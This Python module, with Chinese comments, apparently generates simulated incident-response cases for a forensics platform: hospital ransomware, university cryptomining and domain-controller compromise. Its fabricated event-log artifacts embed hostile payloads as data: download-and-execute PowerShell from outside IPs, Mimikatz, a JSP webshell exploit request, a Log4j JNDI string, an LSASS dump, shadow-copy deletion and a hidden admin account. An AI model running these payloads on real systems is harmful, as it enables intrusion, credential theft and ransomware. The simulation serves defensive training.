"""
三大行业实战应急响应仿真案件生成器 (services/simulation_cases.py)
支持一键生成包含多台涉案主机、横向移动拓扑、真实 POC 载荷、CVE 匹配、勒索/远控特征及完整 AI 报告的仿真案件：
1. hospital   : 🏥 医院勒索应急仿真（泛微OA RCE漏洞 POC -> Webshell -> SMB横向移动至HIS数据库 -> 删除VSS卷影并投递 Mallox 勒索病毒）
2. university : 🎓 高校挖矿木马仿真（Apache Log4j2 JNDI 注入 POC -> Base64 PowerShell 下载 XMRig 挖矿 -> 伪装系统服务持久化）
3. enterprise : 🏢 政企域控失陷仿真（RDP爆破 + 向日葵远控跳板 -> 凭证窃取 -> Pass-the-Hash 横向控制 AD 域控并创建 support$ 影子账户）
"""

import base64
import uuid
from datetime import datetime, timedelta
from typing import Any

from sqlalchemy.ext.asyncio import AsyncSession

from database import Case, CaseHost, HostArtifact, IOCIntelligence
from services.ai_analyzer import run_case_ai_analysis


def _ps_enc(cleartext_cmd: str) -> str:
    """将明文 PowerShell 命令编码为标准 UTF-16LE Base64 (-enc)"""
    return base64.b64encode(cleartext_cmd.encode("utf-16le")).decode("ascii")


async def create_simulation_case(scenario_key: str, db: AsyncSession) -> dict[str, Any]:
    """
    根据 scenario_key ('hospital' | 'university' | 'enterprise') 创建完整实战仿真案件并自动执行 AI 研判
    """
    key = (scenario_key or "hospital").strip().lower()
    base_time = datetime.utcnow() - timedelta(hours=3)
    short_uid = uuid.uuid4().hex[:4].upper()

    if key == "hospital":
        case_code = f"IR-{datetime.now().strftime('%Y%m%d')}-HOSP{short_uid}"
        case_obj = Case(
            case_code=case_code,
            case_name="【医院勒索仿真】某三甲医院泛微OA漏洞突破横向感染HIS数据库(Mallox勒索)事件",
            description=(
                "实战仿真场景：外部攻击者利用泛微 E-Cology OA 前台 RCE 漏洞 (CNVD-2023-12632) 写入内存马与 Webshell，"
                "探测院内网段后通过 SMB 445 横向移动至核心 HIS 数据库服务器，执行 vssadmin 删除卷影副本并投递 .mallox 勒索病毒。"
            ),
            status="analyzing",
            severity="critical",
            industry_type="hospital",
            analyst="卫健应急指挥组",
        )
        db.add(case_obj)
        await db.flush()

        host_oa = CaseHost(
            case_id=case_obj.id,
            hostname="HOSP-OA-WEB01",
            ip_address="172.16.10.18",
            os_version="Windows Server 2019 Datacenter",
            parse_status="completed",
            risk_score=96,
            risk_level="critical",
            compromise_summary="0号病人主机：遭受泛微 E-Cology OA RCE (CNVD-2023-12632) 漏洞利用并派生 Webshell 进程",
        )
        host_his = CaseHost(
            case_id=case_obj.id,
            hostname="HOSP-HIS-DB01",
            ip_address="172.16.20.88",
            os_version="Windows Server 2016 Standard (SQL Server)",
            parse_status="completed",
            risk_score=98,
            risk_level="critical",
            compromise_summary="核心受损资产：遭内网 SMB 横向渗透，被执行 vssadmin 删除卷影并投递 Mallox 勒索软件",
        )
        db.add_all([host_oa, host_his])
        await db.flush()

        ps_cleartext_oa = "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45:8080/weaver_beacon.ps1'); Invoke-Mimikatz -DumpCreds"
        ps_b64_oa = _ps_enc(ps_cleartext_oa)

        artifacts = [
            HostArtifact(
                case_id=case_obj.id,
                host_id=host_oa.id,
                artifact_type="evtx_process",
                source_file="Security.evtx",
                event_id=4688,
                event_time=base_time + timedelta(minutes=2),
                summary="[进程创建] C:\\Windows\\System32\\cmd.exe (PID: 6412, PPID: 3104) CMD: cmd.exe /c echo ^<%execute(request(\"pass\"))%^> > D:\\WEAVER\\ecology\\mobile\\plugin\\shell_oa.jsp",
                parsed_data={
                    "Computer": "HOSP-OA-WEB01",
                    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
                    "NewProcessId": "6412",
                    "ParentProcessId": "3104",
                    "ParentProcessName": "D:\\WEAVER\\Resin\\bin\\java.exe",
                    "CommandLine": 'cmd.exe /c echo <%execute(request("pass"))%> > D:\\WEAVER\\ecology\\mobile\\plugin\\shell_oa.jsp',
                    "ExploitPOC": "POST /weaver/bsh.servlet.BshServlet HTTP/1.1 | bsh.script=exec(\"cmd.exe /c echo <%execute(request(\\\"pass\\\"))%> > D:/WEAVER/ecology/mobile/plugin/shell_oa.jsp\")",
                    "SubjectUserName": "SYSTEM",
                },
                risk_level="critical",
                risk_tags=["T1190", "T1505.003", "泛微OA_RCE漏洞利用", "WebShell写入"],
                is_malicious=True,
            ),
            HostArtifact(
                case_id=case_obj.id,
                host_id=host_oa.id,
                artifact_type="evtx_process",
                source_file="Security.evtx",
                event_id=4688,
                event_time=base_time + timedelta(minutes=6),
                summary=f"[进程创建] C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CMD: powershell.exe -nop -w hidden -enc {ps_b64_oa}",
                parsed_data={
                    "Computer": "HOSP-OA-WEB01",
                    "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "NewProcessId": "7028",
                    "ParentProcessId": "3104",
                    "ParentProcessName": "D:\\WEAVER\\Resin\\bin\\java.exe",
                    "CommandLine": f"powershell.exe -nop -w hidden -enc {ps_b64_oa}",
                    "DecodedPayload": ps_cleartext_oa,
                    "SubjectUserName": "SYSTEM",
                },
                risk_level="critical",
                risk_tags=["T1059.001", "T1027.010", "Base64混淆载荷已解码", "内网凭据收集"],
                is_malicious=True,
            ),
            HostArtifact(
                case_id=case_obj.id,
                host_id=host_his.id,
                artifact_type="evtx_logon",
                source_file="Security.evtx",
                event_id=4624,
                event_time=base_time + timedelta(minutes=18),
                summary="[登录成功] 账号 HOSP\\Administrator 通过 Network (网络登录/SMB/RPC) 登录 (源IP: 172.16.10.18)",
                parsed_data={
                    "Computer": "HOSP-HIS-DB01",
                    "LogonType": "3",
                    "LogonTypeDesc": "Network (网络登录/SMB/RPC)",
                    "IpAddress": "172.16.10.18",
                    "TargetUserName": "Administrator",
                    "TargetDomainName": "HOSP",
                },
                risk_level="high",
                risk_tags=["T1021.002", "SMB内网横向移动"],
                is_malicious=True,
            ),
            HostArtifact(
                case_id=case_obj.id,
                host_id=host_his.id,
                artifact_type="evtx_process",
                source_file="Security.evtx",
                event_id=4688,
                event_time=base_time + timedelta(minutes=21),
                summary="[进程创建] C:\\Windows\\System32\\vssadmin.exe CMD: vssadmin.exe delete shadows /all /quiet & wbadmin delete catalog -quiet & bcdedit /set {default} recoveryenabled no",
                parsed_data={
                    "Computer": "HOSP-HIS-DB01",
                    "NewProcessName": "C:\\Windows\\System32\\vssadmin.exe",
                    "NewProcessId": "4892",
                    "ParentProcessId": "2100",
                    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
                    "CommandLine": "vssadmin.exe delete shadows /all /quiet & wbadmin delete catalog -quiet & bcdedit /set {default} recoveryenabled no",
                    "SubjectUserName": "Administrator",
                },
                risk_level="critical",
                risk_tags=["T1490", "T1070.001", "卷影副本删除(勒索软件特征)"],
                is_malicious=True,
            ),
            HostArtifact(
                case_id=case_obj.id,
                host_id=host_his.id,
                artifact_type="evtx_process",
                source_file="Security.evtx",
                event_id=4688,
                event_time=base_time + timedelta(minutes=23),
                summary="[进程创建] C:\\Users\\Public\\mallox_crypt.exe CMD: C:\\Users\\Public\\mallox_crypt.exe -path E:\\HIS_MSSQL\\Data --ext .mallox",
                parsed_data={
                    "Computer": "HOSP-HIS-DB01",
                    "NewProcessName": "C:\\Users\\Public\\mallox_crypt.exe",
                    "NewProcessId": "5120",
                    "ParentProcessId": "2100",
                    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
                    "CommandLine": "C:\\Users\\Public\\mallox_crypt.exe -path E:\\HIS_MSSQL\\Data --ext .mallox",
                    "SubjectUserName": "Administrator",
                },
                risk_level="critical",
                risk_tags=["T1486", "Mallox勒索病毒加密执行"],
                is_malicious=True,
            ),
            HostArtifact(
                case_id=case_obj.id,
                host_id=host_his.id,
                artifact_type="evtx_service",
                source_file="System.evtx",
                event_id=7045,
                event_time=base_time + timedelta(minutes=24),
                summary="[新安装服务] 服务名: Mallox Guard Svc, 路径: %COMSPEC% /c start C:\\Users\\Public\\mallox_crypt.exe (启动账户: LocalSystem)",
                parsed_data={
                    "Computer": "HOSP-HIS-DB01",
                    "ServiceName": "MalloxGuardSvc",
                    "ImagePath": "%COMSPEC% /c start C:\\Users\\Public\\mallox_crypt.exe",
                    "ServiceType": "user mode service",
                    "StartType": "auto start",
                    "AccountName": "LocalSystem",
                },
                risk_level="critical",
                risk_tags=["T1543.003", "高危恶意服务后门/命令执行持久化"],
                is_malicious=True,
            ),
        ]
        db.add_all(artifacts)
        db.add(
            IOCIntelligence(
                case_id=case_obj.id,
                host_id=host_oa.id,
                ioc_type="ip",
                ioc_value="185.220.101.45",
                threat_level="malicious",
                confidence=98,
                source="ThreatBook / Built-in TI",
                tags=["Mallox_Ransomware_C2", "Weaver_OA_Exploit_Source", "Tor_Exit_Node"],
            )
        )

    elif key == "university":
        case_code = f"IR-{datetime.now().strftime('%Y%m%d')}-UNIV{short_uid}"
        case_obj = Case(
            case_code=case_code,
            case_name="【高校挖矿仿真】某高校科研门户 Log4j2 漏洞注入与 HPC 算力节点 XMRig 门罗币挖矿驻留事件",
            description=(
                "实战仿真场景：攻击者针对高校科研管理平台发送 Log4j2 JNDI 远程代码执行载荷 (CVE-2021-44228)，"
                "利用编码后的 PowerShell 下载门罗币挖矿程序 xmrig.exe，并通过创建计划任务与伪装 Windows Update 服务实现持久化。"
            ),
            status="analyzing",
            severity="high",
            industry_type="university",
            analyst="高校信息中心CERT",
        )
        db.add(case_obj)
        await db.flush()

        host_web = CaseHost(
            case_id=case_obj.id,
            hostname="UNIV-PORTAL-APP01",
            ip_address="210.28.112.36",
            os_version="Windows Server 2019 Datacenter",
            parse_status="completed",
            risk_score=92,
            risk_level="critical",
            compromise_summary="0号病人主机：科研门户 Tomcat 遭受 Log4j2 JNDI 注入 (CVE-2021-44228) 并植入矿机下载器",
        )
        host_gpu = CaseHost(
            case_id=case_obj.id,
            hostname="UNIV-LAB-GPU02",
            ip_address="10.10.88.102",
            os_version="Windows Server 2022 Standard (HPC Node)",
            parse_status="completed",
            risk_score=89,
            risk_level="critical",
            compromise_summary="实验室算力节点：被植入 XMRig 挖矿木马服务与定时拉起计划任务，CPU 占用率 100%",
        )
        db.add_all([host_web, host_gpu])
        await db.flush()

        ps_cleartext_miner = (
            "Invoke-WebRequest -Uri 'http://91.215.85.142/c3pool/xmrig.exe' -OutFile 'C:\\ProgramData\\WinUpdateSvc.exe'; "
            "Start-Process 'C:\\ProgramData\\WinUpdateSvc.exe' -ArgumentList '-o pool.supportxmr.com:3333 -u 44AFFq5kSiGBoZ... -k --tls'"
        )
        ps_b64_miner = _ps_enc(ps_cleartext_miner)

        artifacts = [
            HostArtifact(
                case_id=case_obj.id,
                host_id=host_web.id,
                artifact_type="evtx_process",
                source_file="Security.evtx",
                event_id=4688,
                event_time=base_time + timedelta(minutes=3),
                summary=f"[进程创建] C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CMD: powershell.exe -NoP -NonI -W Hidden -enc {ps_b64_miner}",
                parsed_data={
                    "Computer": "UNIV-PORTAL-APP01",
                    "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "NewProcessId": "8812",
                    "ParentProcessId": "1940",
                    "ParentProcessName": "C:\\Apache\\Tomcat9\\bin\\tomcat9.exe",
                    "CommandLine": f"powershell.exe -NoP -NonI -W Hidden -enc {ps_b64_miner}",
                    "ExploitPOC": 'User-Agent: ${jndi:ldap://91.215.85.142:1389/Basic/Command/Base64/' + ps_b64_miner[:48] + '...}',
                    "DecodedPayload": ps_cleartext_miner,
                    "SubjectUserName": "LOCAL SERVICE",
                },
                risk_level="critical",
                risk_tags=["T1190", "T1059.001", "T1027.010", "Log4j2_JNDI注入", "Base64混淆载荷已解码"],
                is_malicious=True,
            ),
            HostArtifact(
                case_id=case_obj.id,
                host_id=host_gpu.id,
                artifact_type="evtx_process",
                source_file="Security.evtx",
                event_id=4688,
                event_time=base_time + timedelta(minutes=15),
                summary="[进程创建] C:\\Windows\\System32\\schtasks.exe CMD: schtasks /create /tn \"Microsoft\\Windows\\WinMinerUpdater\" /tr \"powershell.exe -w hidden -c C:\\ProgramData\\WinUpdateSvc.exe\" /sc minute /mo 15 /ru SYSTEM /f",
                parsed_data={
                    "Computer": "UNIV-LAB-GPU02",
                    "NewProcessName": "C:\\Windows\\System32\\schtasks.exe",
                    "NewProcessId": "9104",
                    "ParentProcessId": "4420",
                    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
                    "CommandLine": 'schtasks /create /tn "Microsoft\\Windows\\WinMinerUpdater" /tr "powershell.exe -w hidden -c C:\\ProgramData\\WinUpdateSvc.exe" /sc minute /mo 15 /ru SYSTEM /f',
                    "SubjectUserName": "SYSTEM",
                },
                risk_level="high",
                risk_tags=["T1053.005", "计划任务/注册表/服务持久化驻留"],
                is_malicious=True,
            ),
            HostArtifact(
                case_id=case_obj.id,
                host_id=host_gpu.id,
                artifact_type="evtx_service",
                source_file="System.evtx",
                event_id=7045,
                event_time=base_time + timedelta(minutes=17),
                summary="[新安装服务] 服务名: WinDefenderCoreUpdate, 路径: C:\\ProgramData\\WinUpdateSvc.exe --donate-level 1 -o pool.supportxmr.com:3333 (启动账户: LocalSystem)",
                parsed_data={
                    "Computer": "UNIV-LAB-GPU02",
                    "ServiceName": "WinDefenderCoreUpdate",
                    "ImagePath": "C:\\ProgramData\\WinUpdateSvc.exe --donate-level 1 -o pool.supportxmr.com:3333",
                    "ServiceType": "user mode service",
                    "StartType": "auto start",
                    "AccountName": "LocalSystem",
                },
                risk_level="critical",
                risk_tags=["T1543.003", "T1496", "可疑非标准路径服务安装", "XMRig挖矿服务伪装"],
                is_malicious=True,
            ),
        ]
        db.add_all(artifacts)
        db.add(
            IOCIntelligence(
                case_id=case_obj.id,
                host_id=host_web.id,
                ioc_type="ip",
                ioc_value="91.215.85.142",
                threat_level="malicious",
                confidence=95,
                source="ThreatBook / Built-in TI",
                tags=["Log4Shell_LDAP_Exploit", "XMRig_Mining_Dropper"],
            )
        )

    else:  # enterprise
        case_code = f"IR-{datetime.now().strftime('%Y%m%d')}-CORP{short_uid}"
        case_obj = Case(
            case_code=case_code,
            case_name="【政企域控仿真】某集团运维跳板机向日葵远控突破与 AD 域控哈希传递(PtH)失陷事件",
            description=(
                "实战仿真场景：攻击者通过 RDP 口令暴破与向日葵远控漏洞 (CNVD-2022-10270) 控制运维跳板机，"
                "利用 procdump/Mimikatz 转储 LSASS 内存窃取域管 NTLM Hash，横向登录 AD 域控并创建 support$ 影子后门账户。"
            ),
            status="analyzing",
            severity="critical",
            industry_type="enterprise",
            analyst="集团SOC安全运营中心",
        )
        db.add(case_obj)
        await db.flush()

        host_jump = CaseHost(
            case_id=case_obj.id,
            hostname="CORP-OPS-JUMP01",
            ip_address="10.20.1.50",
            os_version="Windows Server 2019 Datacenter",
            parse_status="completed",
            risk_score=94,
            risk_level="critical",
            compromise_summary="0号病人主机：遭外部 RDP 暴破及向日葵 (SunloginClient.exe) RCE 漏洞利用，LSASS 内存被转储",
        )
        host_dc = CaseHost(
            case_id=case_obj.id,
            hostname="CORP-AD-DC01",
            ip_address="10.20.0.10",
            os_version="Windows Server 2019 Datacenter (Domain Controller)",
            parse_status="completed",
            risk_score=99,
            risk_level="critical",
            compromise_summary="核心域控主机：遭 Pass-the-Hash 横向登录并创建隐藏影子后门账号 support$ 及 WMI 持久化",
        )
        db.add_all([host_jump, host_dc])
        await db.flush()

        ps_cleartext_dc = "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 684 C:\\Windows\\Temp\\lsass_dump.dmp full"
        ps_b64_dc = _ps_enc(ps_cleartext_dc)

        artifacts = [
            HostArtifact(
                case_id=case_obj.id,
                host_id=host_jump.id,
                artifact_type="evtx_logon",
                source_file="Security.evtx",
                event_id=4625,
                event_time=base_time + timedelta(minutes=1),
                summary="[登录失败] 账号 CORP\\itadmin 登录被拒绝 (RemoteInteractive (RDP远程桌面登录), 源IP: 103.145.12.88, 状态码: 0xc000006d)",
                parsed_data={
                    "Computer": "CORP-OPS-JUMP01",
                    "LogonType": "10",
                    "LogonTypeDesc": "RemoteInteractive (RDP远程桌面登录)",
                    "IpAddress": "103.145.12.88",
                    "TargetUserName": "itadmin",
                    "TargetDomainName": "CORP",
                    "Status": "0xc000006d",
                },
                risk_level="high",
                risk_tags=["T1110", "疑似远程口令暴破"],
                is_malicious=True,
            ),
            HostArtifact(
                case_id=case_obj.id,
                host_id=host_jump.id,
                artifact_type="evtx_process",
                source_file="Security.evtx",
                event_id=4688,
                event_time=base_time + timedelta(minutes=5),
                summary=f"[进程创建] C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CMD: powershell.exe -enc {ps_b64_dc}",
                parsed_data={
                    "Computer": "CORP-OPS-JUMP01",
                    "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "NewProcessId": "5316",
                    "ParentProcessId": "2840",
                    "ParentProcessName": "C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\SunloginClient.exe",
                    "CommandLine": f"powershell.exe -enc {ps_b64_dc}",
                    "ExploitPOC": "GET /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+-enc+" + ps_b64_dc[:40] + "... HTTP/1.1 (Host: 10.20.1.50:49668, Cookie: CID=8a91b2...)",
                    "DecodedPayload": ps_cleartext_dc,
                    "SubjectUserName": "SYSTEM",
                },
                risk_level="critical",
                risk_tags=["T1003.001", "T1027.010", "向日葵远控RCE利用", "凭据转储与LSASS内存窃取"],
                is_malicious=True,
            ),
            HostArtifact(
                case_id=case_obj.id,
                host_id=host_dc.id,
                artifact_type="evtx_logon",
                source_file="Security.evtx",
                event_id=4624,
                event_time=base_time + timedelta(minutes=16),
                summary="[登录成功] 账号 CORP\\Administrator 通过 Network (网络登录/SMB/RPC) 登录 (源IP: 10.20.1.50)",
                parsed_data={
                    "Computer": "CORP-AD-DC01",
                    "LogonType": "3",
                    "LogonTypeDesc": "Network (网络登录/SMB/RPC)",
                    "IpAddress": "10.20.1.50",
                    "TargetUserName": "Administrator",
                    "TargetDomainName": "CORP",
                },
                risk_level="critical",
                risk_tags=["T1550.002", "T1021.002", "Pass-the-Hash域控横向登录"],
                is_malicious=True,
            ),
            HostArtifact(
                case_id=case_obj.id,
                host_id=host_dc.id,
                artifact_type="evtx_account",
                source_file="Security.evtx",
                event_id=4720,
                event_time=base_time + timedelta(minutes=19),
                summary="[创建新用户] 操作者 CORP\\Administrator 创建了新账号 CORP\\support$ (SID: S-1-5-21-38912041-1009)",
                parsed_data={
                    "Computer": "CORP-AD-DC01",
                    "TargetUserName": "support$",
                    "TargetDomainName": "CORP",
                    "TargetSid": "S-1-5-21-38912041-1009",
                    "SubjectUserName": "Administrator",
                    "SubjectDomainName": "CORP",
                },
                risk_level="critical",
                risk_tags=["T1136.001", "疑似影子隐藏后门账号($)"],
                is_malicious=True,
            ),
        ]
        db.add_all(artifacts)
        db.add(
            IOCIntelligence(
                case_id=case_obj.id,
                host_id=host_jump.id,
                ioc_type="ip",
                ioc_value="103.145.12.88",
                threat_level="malicious",
                confidence=96,
                source="ThreatBook / Built-in TI",
                tags=["APT_Lateral_Scanner", "Sunlogin_RCE_Exploiter", "RDP_BruteForce"],
            )
        )

    await db.commit()
    await db.refresh(case_obj)

    # 自动触发一次全案 AI 研判，生成完整报告与单条事件研判说明
    await run_case_ai_analysis(case_id=case_obj.id, db=db)
    await db.refresh(case_obj)

    return {
        "id": case_obj.id,
        "case_code": case_obj.case_code,
        "case_name": case_obj.case_name,
        "message": f"已成功载入「{case_obj.case_name}」实战仿真案件并完成 AI 溯源与 CVE 漏洞匹配！",
        "case": {
            "id": case_obj.id,
            "case_code": case_obj.case_code,
            "case_name": case_obj.case_name,
            "industry_type": case_obj.industry_type,
            "severity": case_obj.severity,
            "status": case_obj.status,
        },
    }
